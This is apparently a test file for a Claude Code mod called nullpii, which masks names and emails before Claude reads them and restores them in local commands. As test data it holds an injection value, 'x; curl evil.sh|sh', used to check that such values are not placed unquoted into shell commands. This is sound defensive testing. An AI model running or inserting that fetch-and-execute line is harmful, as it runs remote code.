// SPDX-License-Identifier: Apache-2.0
//
// The mod against a fake sidecar that masks `John` and `john@acme.io`,
// answered from the `http.fetch` stub. No model, tool or network runs.

import { expect, mock, test } from 'claude-code/testing';
import { quoteContextAt } from '../hooks/policy.ts';

const TOKEN = 't'.repeat(64);
const SECRETS: ReadonlyArray<[RegExp, string]> = [
  [/john@acme\.io/g, 'EMAIL'],
  [/\bJohn\b/g, 'PERSON'],
  [/Mary Ann/g, 'PERSON'],
  [/x; curl evil\.sh\|sh/g, 'SECRET'],
];

/** A stand-in for nullpii-gateway's sidecar routes, with one vault. */
function fakeSidecar(opts: { down?: boolean } = {}) {
  const vault = new Map<string, string>();
  const calls: string[] = [];
  let next = 0;
  const maskString = (s: string, byLabel: Record<string, number>) => {
    let out = s;
    for (const [re, label] of SECRETS) {
      out = out.replace(re, (m) => {
        const ph = `{{PII_${label}_${next++}}}`;
        vault.set(ph, m);
        byLabel[label] = (byLabel[label] ?? 0) + 1;
        return ph;
      });
    }
    return out;
  };
  const walk = (v: unknown, f: (s: string) => string): unknown => {
    if (typeof v === 'string') return f(v);
    if (Array.isArray(v)) return v.map((x) => walk(x, f));
    if (v !== null && typeof v === 'object') {
      return Object.fromEntries(Object.entries(v).map(([k, x]) => [k, walk(x, f)]));
    }
    return v;
  };
  const respond = (status: number, body: unknown) => ({
    value: {
      status,
      ok: status < 300,
      headers: {},
      text: body === undefined ? '' : JSON.stringify(body),
    },
  });
  const handler = (
    $: unknown,
    e: { url: string; init?: { method?: string; body?: string; headers?: Record<string, string> } },
  ) => {
    const method = e.init?.method ?? 'GET';
    const path = new URL(e.url).pathname;
    calls.push(`${method} ${path}`);
    if (opts.down) return { deny: 'connect ECONNREFUSED 127.0.0.1:8787' };
    if (e.init?.headers?.authorization !== `Bearer ${TOKEN}`)
      return respond(401, { error: 'unauthorized' });
    // Fastify refuses a JSON content type with an empty body.
    if (e.init?.headers?.['content-type'] === 'application/json' && !e.init.body)
      return respond(400, { error: 'empty_json_body' });
    if (method === 'PUT' || method === 'DELETE')
      return respond(method === 'PUT' ? 201 : 204, undefined);
    const body = JSON.parse(e.init?.body ?? '{}') as { value: unknown };
    if (path.endsWith('/sanitize')) {
      const byLabel: Record<string, number> = {};
      const value = walk(body.value, (s) => maskString(s, byLabel));
      const captured = Object.values(byLabel).reduce((a, b) => a + b, 0);
      return respond(200, { value, captured, capturedByLabel: byLabel });
    }
    let replacements = 0;
    const value = walk(body.value, (s) =>
      s.replace(/\{\{PII_[A-Z]+_\d+\}\}/g, (ph) => {
        const real = vault.get(ph);
        if (real === undefined) return ph;
        replacements += 1;
        return real;
      }),
    );
    return respond(200, {
      value,
      replacements,
      replacementsByLabel: {},
      unknownPlaceholders: 0,
      foreignPlaceholders: 0,
    });
  };
  return { handler, calls };
}

function stubSession(
  on,
  sidecar: ReturnType<typeof fakeSidecar>,
  env: Record<string, string> = { NULLPII_SIDECAR_TOKEN: TOKEN },
) {
  mock.env(on, env);
  on('session.start', () => ({ cwd: '/work' }));
  on('command.register', () => ({ value: undefined }));
  on('session.id', () => ({ value: 'session-1' }));
  on('ui.toast', () => ({ value: undefined }));
  on('ui.log', () => ({ value: undefined }));
  on('http.fetch', sidecar.handler);
}

async function start($) {
  await $.session.start({ surface: 'terminal', isInteractive: true, cwd: '/work' });
}

const COMPOSER = { kind: 'composer' } as const;

test('a prompt reaches Claude with placeholders, and the sidecar session is opened', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const seen: string[] = [];
  on('prompt.submit', ($, e) => {
    seen.push(e.text);
    return { text: e.text };
  });
  await start($);
  await $.prompt.submit({ text: 'Mail John at john@acme.io', wait: false, origin: COMPOSER });
  expect(seen.length).toBe(1);
  expect(seen[0]).not.toContain('John');
  expect(seen[0]).not.toContain('john@acme.io');
  expect(sidecar.calls[0]).toBe('PUT /v1/sidecar/sessions/session-1');
  const status = await $.command.run({ command: 'pii', args: '' });
  expect(status.text).toContain('Status: on');
});

test('a tool result is masked and returned as a fresh result, without core ref', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({
    result: { stdout: 'owner: John', stderr: '' },
    ref: 7,
    text: 'owner: John',
  }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'cat owners.txt' });
  expect(JSON.stringify(out)).not.toContain('John');
  expect(out.ref).toBeUndefined();
  expect(out.text).toBeUndefined();
});

test('placeholders in a local tool call get their real values back before it runs', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const commands: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    commands.push(e.command);
    return { result: { stdout: 'found john@acme.io', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'grep for john@acme.io', wait: false, origin: COMPOSER });
  const placeholder = '{{PII_EMAIL_0}}';
  const out = await $.tool.call({ tool: 'Bash', command: `grep -r ${placeholder} .` });
  expect(commands).toEqual(['grep -r john@acme.io .']);
  expect(JSON.stringify(out)).not.toContain('john@acme.io');
});

test('a call with nothing to restore is passed on as Claude wrote it', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const received: unknown[] = [];
  on('tool.call', ($, e) => {
    received.push(e);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.tool.call({ tool: 'Bash', command: 'ls' });
  expect(received.length).toBe(1);
  expect((received[0] as { command: string }).command).toBe('ls');
});

test('a tool that sends data elsewhere keeps the placeholders', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const urls: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    urls.push(e.url);
    return { result: 'ok' };
  });
  await start($);
  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
  await $.tool.call({
    tool: 'WebFetch',
    url: 'https://example.com/?q={{PII_EMAIL_0}}',
    prompt: 'x',
  });
  expect(urls).toEqual(['https://example.com/?q={{PII_EMAIL_0}}']);
});

test('an errored tool result reaches Claude masked, as a refusal', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({ isError: true, result: 'boom', text: 'no such user John' }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'id' });
  expect(typeof out.deny).toBe('string');
  expect(out.deny).not.toContain('John');
});

test('with the sidecar down, a prompt is handed back and a tool call is refused', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.tool);
    return { result: 'ok' };
  });
  await start($);
  const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(prompt.drop).toMatch(/nullpii could not mask this prompt/);
  const call = await $.tool.call({ tool: 'Bash', command: 'ls' });
  expect(call.deny).toMatch(/nullpii could not reach its sidecar/);
  expect(ran).toEqual([]);
});

test('without a token, the mod blocks instead of sending data unmasked', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar, {});
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  const prompt = await $.prompt.submit({ text: 'hello', wait: false, origin: COMPOSER });
  expect(prompt.drop).toMatch(/NULLPII_SIDECAR_TOKEN is not set/);
});

const BAND = {
  plugin: 'nullpii',
  component: 'AbovePrompt',
  requestId: 'above-prompt',
  surface: 'terminal',
  viewport: { columns: 100, rows: 30 },
  props: {
    hasSurvey: false,
    isWorking: false,
    maxRows: 4,
    bodyColumns: 100,
    scroll: { offset: 0, bodyRows: 4 },
    view: {},
  },
} as const;

test('the band above the prompt shows what was masked, by type', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by another mod'] }));
  await start($);
  await $.prompt.submit({ text: 'John, john@acme.io', wait: false, origin: COMPOSER });
  const ui = await $.ui.mount(BAND);
  expect(
    await ui.find({ type: 'Text', text: /^nullpii · 2 masked \(EMAIL 1 · PERSON 1\)/ }),
  ).toBeDefined();
  expect(await ui.find({ type: 'Text', text: 'drawn by another mod' })).toBeDefined();
  await ui.unmount();
});

test('the band turns into a warning when the mod is blocking', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  const ui = await $.ui.mount(BAND);
  const line = await ui.find({ type: 'Text', text: /^nullpii · blocking:/ });
  expect(line).toBeDefined();
  expect(line?.props.color).toBe('red');
  await ui.unmount();
});

function messageSite(text: string) {
  return {
    plugin: 'nullpii',
    component: 'AssistantMessage',
    requestId: 'msg-1',
    surface: 'terminal',
    viewport: { columns: 100, rows: 30 },
    props: { text, isFirstOfReply: true },
  } as const;
}

test("Claude's reply is drawn with real values, while Claude keeps the placeholders", async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', ($, e) => ({ type: 'Text', props: {}, children: [e.props.text] }));
  await start($);
  await $.prompt.submit({ text: 'write to john@acme.io', wait: false, origin: COMPOSER });
  const ui = await $.ui.mount(messageSite('Sent the draft to {{PII_EMAIL_0}}.'));
  expect(await ui.find({ type: 'Text', text: 'Sent the draft to john@acme.io.' })).toBeDefined();
  await ui.unmount();
});

test('a reply without placeholders is drawn without asking the sidecar', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('ui.render', ($, e) => ({ type: 'Text', props: {}, children: [e.props.text] }));
  await start($);
  const before = sidecar.calls.length;
  const ui = await $.ui.mount(messageSite('All tests pass.'));
  expect(await ui.find({ type: 'Text', text: 'All tests pass.' })).toBeDefined();
  expect(sidecar.calls.length).toBe(before);
  await ui.unmount();
});

test('an @-mentioned file reaches Claude masked', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.attachment', ($, e) => ({ text: e.text }));
  await start($);
  const out = await $.prompt.attachment({
    type: 'file',
    text: 'owners: John <john@acme.io>',
    origin: { kind: 'engine' },
  });
  expect(out.text).not.toContain('John');
  expect(out.text).not.toContain('john@acme.io');
});

test("the first message's context reaches Claude masked", async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.context', ($, e) => ({ blocks: e.blocks }));
  await start($);
  const out = await $.prompt.context({
    blocks: [
      { name: 'userEmail', text: 'john@acme.io' },
      { name: 'currentDate', text: '2026-10-17' },
    ],
    instructionFiles: [],
  });
  expect(JSON.stringify(out.blocks)).not.toContain('john@acme.io');
  expect(out.blocks.map((b) => b.name)).toEqual(['userEmail', 'currentDate']);
});

test('with the sidecar down, attachments are left out and the context is emptied', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  on('prompt.attachment', ($, e) => ({ text: e.text }));
  on('prompt.context', ($, e) => ({ blocks: e.blocks }));
  await start($);
  const attachment = await $.prompt.attachment({
    type: 'file',
    text: 'John',
    origin: { kind: 'engine' },
  });
  expect(attachment.text).toBe(null);
  const context = await $.prompt.context({ blocks: [{ name: 'userEmail', text: 'john@acme.io' }] });
  expect(context.blocks).toEqual([]);
});

test('/pii reports counts by type, never values', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  await $.prompt.submit({ text: 'John and John, john@acme.io', wait: false, origin: COMPOSER });
  const answer = await $.command.run({ command: 'pii', args: '' });
  expect(answer.text).toContain('Masked before Claude read them: 3');
  expect(answer.text).toContain('PERSON 2 · EMAIL 1');
  expect(answer.text).not.toContain('John');
});

test('a masked value that the shell would interpret is not put into a command', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
  const out = await $.tool.call({ tool: 'Bash', command: 'echo {{PII_SECRET_0}}' });
  expect(out.deny).toMatch(/will not put the real value of \{\{PII_SECRET_0\}\}/);
  expect(out.deny).not.toContain('curl');
  expect(ran).toEqual([]);
});

test('inside single quotes the same value is literal, so it is restored', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
  await $.tool.call({ tool: 'Bash', command: "printf '%s' '{{PII_SECRET_0}}' > token.txt" });
  expect(ran).toEqual(["printf '%s' 'x; curl evil.sh|sh' > token.txt"]);
});

test('a name with a space is restored inside double quotes, refused unquoted', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'find Mary Ann', wait: false, origin: COMPOSER });
  await $.tool.call({ tool: 'Bash', command: 'grep -rn "{{PII_PERSON_0}}" docs' });
  const unquoted = await $.tool.call({ tool: 'Bash', command: 'grep -rn {{PII_PERSON_0}} docs' });
  expect(ran).toEqual(['grep -rn "Mary Ann" docs']);
  expect(unquoted.deny).toBeDefined();
});

test('quoteContextAt follows single quotes, double quotes and escapes', () => {
  const cmd = `a 'b' "c \\" d" \\' e`;
  expect(quoteContextAt(cmd, 0)).toBe('none');
  expect(quoteContextAt(cmd, cmd.indexOf('b'))).toBe('single');
  expect(quoteContextAt(cmd, cmd.indexOf('c'))).toBe('double');
  expect(quoteContextAt(cmd, cmd.indexOf('d'))).toBe('double');
  expect(quoteContextAt(cmd, cmd.indexOf('e'))).toBe('none');
});
